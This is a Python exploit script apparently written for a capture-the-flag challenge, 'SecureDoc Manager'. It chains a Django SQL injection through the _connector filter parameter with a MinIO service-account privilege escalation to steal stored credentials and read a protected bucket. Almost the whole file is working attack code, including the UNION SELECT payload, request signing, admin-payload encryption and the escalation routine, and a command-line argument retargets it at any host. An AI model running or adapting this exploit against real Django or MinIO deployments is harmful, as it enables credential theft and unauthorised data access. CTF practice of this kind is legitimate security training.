#!/usr/bin/env python3
"""
Complete Exploit for SecureDoc Manager CTF Challenge

Attack Flow:
1. Register a new account on the webapp
2. Login to get JWT token
3. SQL Injection via CVE-2025-64459 (_connector) to extract MinIO credentials
4. Test extracted credentials - identify which one is exploitable
5. Exploit CVE-2025-62506 to create unrestricted service account
6. Access flag-storage bucket and retrieve the flag

Requirements:
    pip install requests argon2-cffi pycryptodome
"""

import hashlib
import hmac
import datetime
import requests
import os
import json
import sys
import random
import string
from urllib.parse import quote
import xml.etree.ElementTree as ET

# For MinIO Admin API encryption
from argon2.low_level import Type, hash_secret_raw
from Crypto.Cipher import AES


# =============================================================================
# Configuration
# =============================================================================

# Target URL - can be overridden via command line argument
TARGET_URL = "http://127.0.0.1:8000"

# Internal MinIO host (what signatures are computed for)
MINIO_HOST = "minio:9000"

# Session for connection pooling
session = requests.Session()


# =============================================================================
# MinIO Admin API Encryption (from minio/crypto.py)
# =============================================================================

_TAG_LEN = 16
_CHUNK_SIZE = 16 * 1024
_SALT_LEN = 32
_NONCE_LEN = 8


def _generate_key(secret: bytes, salt: bytes) -> bytes:
    """Generate 256-bit Argon2ID key"""
    return hash_secret_raw(
        secret=secret,
        salt=salt,
        time_cost=1,
        memory_cost=65536,
        parallelism=4,
        hash_len=32,
        type=Type.ID,
        version=19,
    )


def _generate_additional_data(aead_id: int, key: bytes, padded_nonce: bytes) -> bytes:
    """Generate additional data"""
    cipher = AES.new(key, AES.MODE_GCM, padded_nonce)
    return b"\x00" + cipher.digest()


def _mark_as_last(additional_data: bytes) -> bytes:
    """Mark additional data as the last in the sequence"""
    return b'\x80' + additional_data[1:]


def _update_nonce_id(nonce: bytes, idx: int) -> bytes:
    """Set nonce id (4 last bytes)"""
    return nonce + idx.to_bytes(4, byteorder="little")


def encrypt_admin_payload(payload: bytes, password: str) -> bytes:
    """Encrypt payload for MinIO Admin API."""
    nonce = os.urandom(_NONCE_LEN)
    salt = os.urandom(_SALT_LEN)
    key = _generate_key(password.encode(), salt)
    aead_id = b"\x00"  # AES-GCM
    padded_nonce = nonce + b"\x00\x00\x00\x00"
    additional_data = _generate_additional_data(aead_id[0], key, padded_nonce)

    indices = list(range(0, len(payload), _CHUNK_SIZE))
    nonce_id = 0
    result = salt + aead_id + nonce
    for i in indices:
        nonce_id += 1
        if i == indices[-1]:
            additional_data = _mark_as_last(additional_data)
        padded_nonce = _update_nonce_id(nonce, nonce_id)
        cipher = AES.new(key, AES.MODE_GCM, padded_nonce)
        cipher.update(additional_data)
        encrypted_data, hmac_tag = cipher.encrypt_and_digest(
            payload[i:i+_CHUNK_SIZE],
        )
        result += encrypted_data
        result += hmac_tag

    return result


def decrypt_admin_response(data: bytes, password: str) -> bytes:
    """Decrypt MinIO Admin API response."""
    if len(data) < 41:
        return data
    
    salt = data[:32]
    aead_id = data[32]
    nonce = data[33:41]
    encrypted_payload = data[41:]
    
    key = _generate_key(password.encode(), salt)
    padded_nonce = nonce + b"\x00\x00\x00\x00"
    additional_data = _generate_additional_data(aead_id, key, padded_nonce)
    
    additional_data = _mark_as_last(additional_data)
    padded_nonce = _update_nonce_id(nonce, 1)
    cipher = AES.new(key, AES.MODE_GCM, padded_nonce)
    cipher.update(additional_data)
    
    hmac_tag = encrypted_payload[-_TAG_LEN:]
    encrypted_data = encrypted_payload[:-_TAG_LEN]
    
    try:
        decrypted_data = cipher.decrypt_and_verify(encrypted_data, hmac_tag)
        return decrypted_data
    except Exception as e:
        return data


# =============================================================================
# AWS Signature V4 Implementation
# =============================================================================

def sign(key, msg):
    """HMAC-SHA256 signing"""
    return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()


def get_signature_key(secret_key, date_stamp, region, service):
    """Derive the signing key for AWS Signature V4"""
    k_date = sign(('AWS4' + secret_key).encode('utf-8'), date_stamp)
    k_region = sign(k_date, region)
    k_service = sign(k_region, service)
    k_signing = sign(k_service, 'aws4_request')
    return k_signing


def create_aws_signature_v4_headers(method, uri, query_params, payload, 
                                     access_key, secret_key, 
                                     region='us-east-1', service='s3'):
    """Create AWS Signature V4 headers for a request."""
    t = datetime.datetime.utcnow()
    amz_date = t.strftime('%Y%m%dT%H%M%SZ')
    date_stamp = t.strftime('%Y%m%d')
    
    if payload:
        payload_hash = hashlib.sha256(payload).hexdigest()
    else:
        payload_hash = hashlib.sha256(b'').hexdigest()
    
    headers = {
        'host': MINIO_HOST,
        'x-amz-date': amz_date,
        'x-amz-content-sha256': payload_hash,
    }
    
    signed_headers_list = sorted(headers.keys())
    canonical_headers = ''.join([f"{k}:{headers[k]}\n" for k in signed_headers_list])
    signed_headers = ';'.join(signed_headers_list)
    
    if query_params:
        canonical_querystring = '&'.join([
            f"{quote(str(k), safe='')}={quote(str(v), safe='')}" 
            for k, v in sorted(query_params.items())
        ])
    else:
        canonical_querystring = ''
    
    canonical_request = f"{method}\n{uri}\n{canonical_querystring}\n{canonical_headers}\n{signed_headers}\n{payload_hash}"
    
    algorithm = 'AWS4-HMAC-SHA256'
    credential_scope = f"{date_stamp}/{region}/{service}/aws4_request"
    string_to_sign = f"{algorithm}\n{amz_date}\n{credential_scope}\n{hashlib.sha256(canonical_request.encode()).hexdigest()}"
    
    signing_key = get_signature_key(secret_key, date_stamp, region, service)
    signature = hmac.new(signing_key, string_to_sign.encode(), hashlib.sha256).hexdigest()
    
    authorization = f"{algorithm} Credential={access_key}/{credential_scope}, SignedHeaders={signed_headers}, Signature={signature}"
    
    return {
        'x-amz-date': amz_date,
        'x-amz-content-sha256': payload_hash,
        'Authorization': authorization,
    }


# =============================================================================
# S3 Operations via Proxy
# =============================================================================

def s3_request(method, uri, query_params=None, payload=None, 
               access_key=None, secret_key=None):
    """Make an S3 request through the proxy"""
    headers = create_aws_signature_v4_headers(
        method, uri, query_params or {}, payload, access_key, secret_key
    )
    
    url = f"{TARGET_URL}/s3{uri}"
    if query_params:
        url += '?' + '&'.join([f"{k}={v}" for k, v in query_params.items()])
    return session.request(
        method=method,
        url=url,
        headers=headers,
        data=payload,
        timeout=30
    )


def s3_list_buckets(access_key, secret_key):
    """List all buckets"""
    response = s3_request('GET', '/', access_key=access_key, secret_key=secret_key)
    
    buckets = []
    if response.status_code == 200:
        root = ET.fromstring(response.text)
        ns = {'s3': 'http://s3.amazonaws.com/doc/2006-03-01/'}
        for bucket in root.findall('.//s3:Bucket/s3:Name', ns):
            buckets.append(bucket.text)
    
    return response.status_code, buckets


def s3_list_objects(bucket, access_key, secret_key, prefix=''):
    """List objects in a bucket"""
    query_params = {'list-type': '2'}
    if prefix:
        query_params['prefix'] = prefix
    
    response = s3_request('GET', f'/{bucket}', query_params, 
                          access_key=access_key, secret_key=secret_key)
    
    objects = []
    if response.status_code == 200:
        root = ET.fromstring(response.text)
        ns = {'s3': 'http://s3.amazonaws.com/doc/2006-03-01/'}
        for obj in root.findall('.//s3:Contents/s3:Key', ns):
            objects.append(obj.text)
    
    return response.status_code, objects


def s3_get_object(bucket, key, access_key, secret_key):
    """Get an object from a bucket"""
    response = s3_request('GET', f'/{bucket}/{key}', 
                          access_key=access_key, secret_key=secret_key)
    
    if response.status_code == 200:
        return response.status_code, response.text
    else:
        return response.status_code, None


def minio_admin_add_service_account(parent_access_key, parent_secret_key, 
                                     new_access_key, new_secret_key):
    """Create a new service account using MinIO Admin API (CVE-2025-62506)"""
    body_dict = {
        "status": "enabled",
        "accessKey": new_access_key,
        "secretKey": new_secret_key,
    }
    json_payload = json.dumps(body_dict).encode('utf-8')
    encrypted_payload = encrypt_admin_payload(json_payload, parent_secret_key)
    
    uri = '/minio/admin/v3/add-service-account'
    headers = create_aws_signature_v4_headers(
        'PUT', uri, {}, encrypted_payload,
        parent_access_key, parent_secret_key
    )
    
    response = session.put(
        f"{TARGET_URL}/s3{uri}",
        headers=headers,
        data=encrypted_payload,
        timeout=30
    )
    
    return response


# =============================================================================
# Webapp API Operations
# =============================================================================

def generate_random_string(length=8):
    """Generate a random string for username"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def register_account(username, password):
    """Register a new account"""
    response = session.post(
        f"{TARGET_URL}/api/register/",
        json={
            "username": username,
            "password": password,
            "email": f"{username}@example.com"
        },
        timeout=10
    )
    return response


def login_account(username, password):
    """Login and get JWT token"""
    response = session.post(
        f"{TARGET_URL}/api/login/",
        json={
            "username": username,
            "password": password
        },
        timeout=10
    )
    return response


def sql_injection_extract_credentials(token):
    """
    Exploit CVE-2025-64459 (_connector SQL injection) to extract MinIO credentials.
    
    The vulnerable code in Django unpacks user-supplied JSON into filter():
        filters = json.loads(request.body)
        queryset = Document.objects.filter(**filters)
    
    By supplying _connector with SQL injection payload, we can UNION SELECT
    from the minio_credentials table.
    """
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    # SQL Injection payload using _connector
    # This exploits Django's QuerySet _connector parameter which is not validated
    extract_payload = {
        "category": "aaa",
        "_connector": (
            ") UNION SELECT 114514, access_key, secret_key, 1, created_at, "
            "description, 'x'::text, 1919810 FROM minio_credentials "
            "UNION SELECT id, title, description, owner_id, upload_date, "
            "category, minio_object_name, file_size FROM docs_document WHERE ("
        )
    }
    
    response = session.post(
        f"{TARGET_URL}/api/search/",
        json=extract_payload,
        headers=headers,
        timeout=10
    )
    
    return response


# =============================================================================
# Main Exploit
# =============================================================================

def print_banner():
    print("""
╔══════════════════════════════════════════════════════════════════╗
║     SecureDoc Manager CTF Exploit                                ║
║     CVE-2025-64459 (Django SQL Injection)                        ║
║     CVE-2025-62506 (MinIO Privilege Escalation)                  ║
╚══════════════════════════════════════════════════════════════════╝
""")


def main():
    global TARGET_URL
    
    print_banner()
    
    # Parse command line argument for target URL
    if len(sys.argv) > 1:
        TARGET_URL = sys.argv[1].rstrip('/')
    
    print(f"[*] Target: {TARGET_URL}")
    print()
    
    # ==========================================================================
    # Step 1: Register a new account
    # ==========================================================================
    print("=" * 60)
    print("[Step 1] Registering a new account...")
    print("-" * 60)
    
    username = f"hacker_{generate_random_string()}"
    password = generate_random_string(16)
    
    print(f"    Username: {username}")
    print(f"    Password: {password}")
    
    reg_response = register_account(username, password)
    
    if reg_response.status_code != 200:
        print(f"[!] Registration failed: {reg_response.text}")
        return
    
    reg_data = reg_response.json()
    if not reg_data.get("success"):
        print(f"[!] Registration failed: {reg_data}")
        return
    
    print(f"    [+] Account created successfully!")
    
    # ==========================================================================
    # Step 2: Login to get JWT token
    # ==========================================================================
    print()
    print("=" * 60)
    print("[Step 2] Logging in to get JWT token...")
    print("-" * 60)
    
    login_response = login_account(username, password)
    
    if login_response.status_code != 200:
        print(f"[!] Login failed: {login_response.text}")
        return
    
    login_data = login_response.json()
    if not login_data.get("success"):
        print(f"[!] Login failed: {login_data}")
        return
    
    token = login_data["token"]
    print(f"    [+] JWT Token obtained: {token[:50]}...")
    
    # ==========================================================================
    # Step 3: SQL Injection to extract MinIO credentials
    # ==========================================================================
    print()
    print("=" * 60)
    print("[Step 3] Exploiting CVE-2025-64459 (SQL Injection via _connector)...")
    print("-" * 60)
    
    sqli_response = sql_injection_extract_credentials(token)
    
    if sqli_response.status_code != 200:
        print(f"[!] SQL Injection failed: {sqli_response.text}")
        return
    
    sqli_data = sqli_response.json()
    documents = sqli_data.get("documents", [])
    
    # Extract credentials from the UNION SELECT results
    # The injected rows have id=114514 and file_size=1919810 as markers
    credentials = []
    for doc in documents:
        if doc.get("id") == 114514 and doc.get("file_size") == 1919810:
            # This is our injected row: title=access_key, description=secret_key
            access_key = doc.get("title")
            secret_key = doc.get("description")
            credentials.append({
                "access_key": access_key,
                "secret_key": secret_key,
                "name": doc.get("category", "unknown")  # category contains 'description' from minio_credentials
            })
    
    if not credentials:
        print("[!] No credentials extracted. SQL injection may have failed.")
        print(f"    Raw response: {sqli_data}")
        return
    
    print(f"    [+] Extracted {len(credentials)} credential(s):")
    for i, cred in enumerate(credentials):
        print(f"        [{i+1}] Access Key: {cred['access_key']}")
        print(f"            Secret Key: {cred['secret_key']}")
        print(f"            Description: {cred['name']}")
    
    # ==========================================================================
    # Step 4: Test each credential and find the exploitable one
    # ==========================================================================
    print()
    print("=" * 60)
    print("[Step 4] Testing extracted credentials...")
    print("-" * 60)
    
    exploitable_cred = None
    
    for cred in credentials[::-1]:
        access_key = cred["access_key"]
        secret_key = cred["secret_key"]
        
        print(f"\n    Testing: {access_key}")
        
        # Test listing buckets
        status, buckets = s3_list_buckets(access_key, secret_key)
        print(f"        List Buckets: {status}")
        if buckets:
            print(f"        Visible Buckets: {buckets}")
        
        # Check if any bucket contains "flag" in its name
        flag_buckets = [b for b in buckets if "flag" in b.lower()]
        if flag_buckets:
            print(f"        [!] Found flag-related bucket(s): {flag_buckets}")
            for flag_bucket in flag_buckets:
                status, objects = s3_list_objects(flag_bucket, access_key, secret_key)
                print(f"        Access {flag_bucket}: {status}")
                if status == 200 and objects:
                    print(f"        [!] Direct access to {flag_bucket}! Objects: {objects}")
                    for obj in objects:
                        status, content = s3_get_object(flag_bucket, obj, access_key, secret_key)
                        if status == 200:
                            print(f"\n{'='*60}")
                            print(f"🚩 FLAG FOUND (Direct Access): {content}")
                            print(f"{'='*60}")
                            return
        
        # Try to create a service account (test for CVE-2025-62506)
        print(f"        Testing privilege escalation (CVE-2025-62506)...")
        
        test_ak = f"test-{generate_random_string()}"
        test_sk = generate_random_string(20)
        
        result = minio_admin_add_service_account(access_key, secret_key, test_ak, test_sk)
        
        if result.status_code == 200:
            print(f"        [+] Service account creation SUCCEEDED!")
            print(f"            New Access Key: {test_ak}")
            
            # Verify the new account has elevated privileges
            status, new_buckets = s3_list_buckets(test_ak, test_sk)
            new_flag_buckets = [b for b in new_buckets if "flag" in b.lower()]
            if new_flag_buckets:
                print(f"        [+] New account can see flag-related bucket(s): {new_flag_buckets}")
                exploitable_cred = {
                    "parent_access_key": access_key,
                    "parent_secret_key": secret_key,
                    "new_access_key": test_ak,
                    "new_secret_key": test_sk,
                    "flag_buckets": new_flag_buckets
                }
                break
            else:
                print(f"        [-] New account cannot see flag buckets (limited inheritance)")
        else:
            print(f"        [-] Service account creation failed: {result.status_code}")
            if result.text:
                print(f"            {result.text[:200]}")
    
    if not exploitable_cred:
        print("\n[!] No exploitable credential found.")
        return
    
    # ==========================================================================
    # Step 5: Use escalated credentials to get the flag
    # ==========================================================================
    print()
    print("=" * 60)
    print("[Step 5] Retrieving flag with escalated privileges...")
    print("-" * 60)
    
    new_ak = exploitable_cred["new_access_key"]
    new_sk = exploitable_cred["new_secret_key"]
    flag_buckets = exploitable_cred["flag_buckets"]
    
    # List buckets
    status, buckets = s3_list_buckets(new_ak, new_sk)
    print(f"    Buckets visible: {buckets}")
    
    # Search for flag in flag-related buckets
    for flag_bucket in flag_buckets:
        print(f"\n    Searching in bucket: {flag_bucket}")
        status, objects = s3_list_objects(flag_bucket, new_ak, new_sk)
        print(f"    Objects: {objects}")
        
        if status == 200 and objects:
            for obj in objects:
                status, content = s3_get_object(flag_bucket, obj, new_ak, new_sk)
                if status == 200:
                    print()
                    print("=" * 60)
                    print("🚩 FLAG CAPTURED!")
                    print("=" * 60)
                    print()
                    print(f"    {content}")
                    print()
                    print("=" * 60)
                    return
    
    print("\n[!] Flag file not found in any flag-related bucket.")


if __name__ == "__main__":
    main()
